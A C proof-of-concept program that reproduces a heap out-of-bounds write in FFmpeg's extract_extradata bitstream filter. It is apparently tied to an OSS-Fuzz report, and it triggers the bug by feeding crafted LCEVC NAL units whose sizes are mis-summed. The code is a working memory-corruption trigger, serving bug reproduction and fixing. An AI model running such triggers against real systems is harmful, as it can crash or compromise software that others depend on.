#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/bsf.h"
#include "libavcodec/packet.h"
#include "libavutil/mem.h"

/*
 * Direct reproducer for extract_extradata bsf LCEVC size-accounting bug
 * (OSSFUZZ-492054712). We call the real public av_bsf_* API on the
 * "extract_extradata" bitstream filter with codec_id = AV_CODEC_ID_LCEVC,
 * feeding an Annex-B packet containing several LCEVC config NAL units.
 * write_lcevc_nalu()'s cumulative absolute-position return value gets
 * mis-summed into *size across NALs, producing a *size grossly larger
 * than the buffer actually allocated (based on a correct upper bound),
 * so extract_extradata_filter()'s trailing
 *   memset(extradata + extradata_size, 0, AV_INPUT_BUFFER_PADDING_SIZE);
 * writes out of bounds.
 */

/* One LCEVC NAL unit, 5 bytes total:
 *  byte0-1: 16-bit NAL header (forbidden_zero=0, forbidden_one=1, type=5 bits)
 *  byte2  : payload_size_type(3 bits)=1, payload_type(5 bits)=0 (SEQUENCE_CONFIG)
 *  byte3  : 1 payload byte
 *  byte4  : trailing filler byte (keeps outer while() loop from doing a 2nd block)
 */
static void build_nal(uint8_t *out, int type) {
    /* bit0=0 forbidden_zero, bit1=1 forbidden_one, bits2-6 = type(5 bits), bit7 = 0 */
    out[0] = (uint8_t)(0x40 | ((type & 0x1F) << 1));
    out[1] = 0x00;
    out[2] = (uint8_t)((1 << 5) | 0); /* payload_size_type=1, payload_type=0 (SEQUENCE_CONFIG) */
    out[3] = 0xAB;
    out[4] = 0x00;
}

int main(void) {
    const AVBitStreamFilter *filt = av_bsf_get_by_name("extract_extradata");
    AVBSFContext *ctx = NULL;
    AVPacket *pkt = NULL;
    int ret;
    const int N_NALS = 4;
    uint8_t nal[5];
    uint8_t buf[4 * (3 + 5)];
    int off = 0;

    if (!filt) {
        fprintf(stderr, "extract_extradata bsf not found\n");
        return 2;
    }

    ret = av_bsf_alloc(filt, &ctx);
    if (ret < 0) {
        fprintf(stderr, "av_bsf_alloc failed: %d\n", ret);
        return 2;
    }

    ctx->par_in->codec_id = AV_CODEC_ID_LCEVC;

    ret = av_bsf_init(ctx);
    if (ret < 0) {
        fprintf(stderr, "av_bsf_init failed: %d\n", ret);
        return 2;
    }

    /* build_nal(nal, 29) -> LCEVC_IDR_NUT */
    build_nal(nal, 29);

    for (int i = 0; i < N_NALS; i++) {
        buf[off++] = 0x00;
        buf[off++] = 0x00;
        buf[off++] = 0x01;
        memcpy(buf + off, nal, 5);
        off += 5;
    }

    pkt = av_packet_alloc();
    if (!pkt) {
        fprintf(stderr, "av_packet_alloc failed\n");
        return 2;
    }
    ret = av_new_packet(pkt, off);
    if (ret < 0) {
        fprintf(stderr, "av_new_packet failed: %d\n", ret);
        return 2;
    }
    memcpy(pkt->data, buf, off);

    ret = av_bsf_send_packet(ctx, pkt);
    fprintf(stderr, "av_bsf_send_packet -> %d\n", ret);
    if (ret < 0) {
        return 2;
    }

    while ((ret = av_bsf_receive_packet(ctx, pkt)) >= 0) {
        fprintf(stderr, "got packet size=%d\n", pkt->size);
        av_packet_unref(pkt);
    }
    fprintf(stderr, "av_bsf_receive_packet -> %d (final)\n", ret);

    av_packet_free(&pkt);
    av_bsf_free(&ctx);

    fprintf(stderr, "PoC completed without crash\n");
    return 0;
}
